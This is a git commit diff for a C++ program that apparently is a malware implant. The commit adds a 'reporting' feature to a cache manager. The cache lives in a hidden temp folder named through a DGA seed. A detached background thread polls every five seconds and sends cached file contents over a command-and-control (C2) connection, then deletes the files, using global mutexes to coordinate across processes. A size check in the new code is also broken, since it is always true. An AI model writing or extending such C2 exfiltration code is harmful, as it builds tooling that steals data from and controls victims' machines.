4cc2839060bba624e166048f37d42bd194d947c8
Sgt Supergeil <maxrademacher02@gmail.com>
2021-05-24 21:41:50 +0200

    Implemented reporting of cached files

--- src/cachemanager/cachemanager.cpp
+++ src/cachemanager/cachemanager.cpp
@@ -1,8 +1,7 @@
 #include "cachemanager.h"
 
-CacheManager::CacheManager(int mf) : max_files{mf}
+CacheManager::CacheManager(int mf, C2* c2ptr) : max_files{ mf }, c2connection{c2ptr}
 {
-	//set fsroot
 	auto tmpdir = fs::temp_directory_path();
 	int spec_val = ((conf::dgaseed * 2) % 512)+1;
 	auto subdir = fs::path(dga(spec_val));
@@ -10,6 +9,7 @@ CacheManager::CacheManager(int mf) : max_files{mf}
 	fsroot = (tmpdir / subdir).string();
 	make_fsroot();
 }
+
 
 int CacheManager::cache(netpack::Packet& tocache)
 {
@@ -21,11 +21,17 @@ int CacheManager::cache(netpack::Packet& tocache)
 	LOG("caching packet of size " << sz << " into " << fname);
 
 	std::fstream outfile;
-	outfile.open(fname,std::ios::app |std::ios::binary);
+	outfile.open(fname, std::ios::app | std::ios::binary);
 	outfile.write((char*)netdata.data(), sz);
 	outfile.close();
 
 	return 0;
+}
+
+void CacheManager::start_report_thread()
+{
+	std::thread t(&CacheManager::report_cache_t, this);
+	t.detach();
 }
 
 std::string CacheManager::rand_avail_filename() {
@@ -40,7 +46,7 @@ std::string CacheManager::rand_avail_filename() {
 
 void CacheManager::make_fsroot()
 {
-	if (!fs::exists(fsroot)){
+	if (!fs::exists(fsroot)) {
 		fs::create_directories(fsroot);
 	}
 }
@@ -48,7 +54,8 @@ void CacheManager::make_fsroot()
 stringvec CacheManager::list_files(const std::string& dir)
 {
 	stringvec out;
-	for (const auto& entry : fs::directory_iterator(dir)) {
+
+	for (const auto& entry : fs::directory_iterator(dir, fs::directory_options::skip_permission_denied)) {
 
 		if (entry.is_regular_file()) {
 			out.push_back(entry.path().filename().string());
@@ -67,4 +74,101 @@ stringvec CacheManager::list_folders(const std::string& dir) {
 		}
 	}
 	return out;
+}
+
+void CacheManager::release_file(std::string id) {
+
+	std::string mutex = std::string("Global\\") + id;
+	HANDLE h = CreateMutexA(NULL, FALSE, mutex.c_str());
+
+	if (h != NULL) {
+
+		auto pos = std::find(aquired_files.begin(), aquired_files.end(), h);
+		if (pos != aquired_files.end()) {
+
+			ReleaseMutex(h);
+			CloseHandle(h);
+			aquired_files.erase(pos);
+
+		}
+	}
+}
+
+void CacheManager::report_cached(std::string fname) {
+
+	std::string absname = (fs::path(fsroot) / fs::path(fname)).string();
+
+	if (aquire_file(fname)) {
+
+		std::ifstream file(absname, std::ios::binary | std::ios::ate);
+		auto size = file.tellg();
+
+		if (1 <= size <= 1024 * 100) {
+			LOG("reporting cached file: " << fname);
+
+			file.seekg(0, std::ios::beg);
+
+			std::vector<char> buf(size);
+
+			if (file.read(buf.data(), size)) {
+
+				c2connection->send_raw(buf.data(), size);
+				file.close();
+				fs::remove(absname);
+
+			}
+		}
+
+		if (file.is_open()){
+			file.close();
+		}
+
+		release_file(fname);
+	}
+
+}
+
+void CacheManager::report_cache_t()
+{
+	while (true) {
+		Sleep(5000);
+		if (c2connection->is_alive()) {
+			for (auto fname : list_files(fsroot)) {
+
+				try {
+					report_cached(fname);
+				}
+				catch (std::exception e) {
+					LOG("Exception when reporting cached file " << fname << " : " << e.what());
+				}
+
+			}
+
+		}
+	}
+}
+
+bool CacheManager::aquire_file(std::string id)
+{
+	for (auto& el : list_files(fsroot)) {
+		if (id == el) {
+			goto found;
+		}
+	}return false;
+
+	found:
+
+	std::string mutex = std::string("Global\\") + id;
+	HANDLE h = CreateMutexA(NULL, FALSE, mutex.c_str());
+
+	if (h != NULL) {
+
+		DWORD ret = WaitForSingleObject(h, 0);
+		if (ret == WAIT_ABANDONED || ret == WAIT_OBJECT_0) {
+			aquired_files.push_back(h);
+			return true;
+		}
+	}
+	return false;
+
 }
--- src/cachemanager/cachemanager.h
+++ src/cachemanager/cachemanager.h
@@ -8,27 +8,34 @@
 #include "../types/types.h"
 #include "../c2/dga.h"
 #include "../net/packet.h"
+#include "../c2/c2.h"
 
 
 namespace fs = std::filesystem;
 
 class CacheManager {
 public:
-	CacheManager(int max_files);
+	CacheManager(int max_files,C2* c2ptr);
 
 	int cache(netpack::Packet& tocache);
 	int remove(const std::string id);
 	std::vector<netpack::bytevec> get_all_cached();
+	void start_report_thread();
 
 private:
 	std::string fsroot ;
 	std::string private_folder;
 	const int max_files;
+	std::vector<HANDLE> aquired_files;
+	C2* c2connection = nullptr;
 
 	void make_fsroot();
-
 	stringvec list_files(const std::string& dir);
 	stringvec list_folders(const std::string& dir);
 	std::string rand_avail_filename();
+	bool aquire_file(std::string id);
+	void release_file(std::string id);
+	void report_cache_t();
+	void report_cached(std::string fname);
 
 };
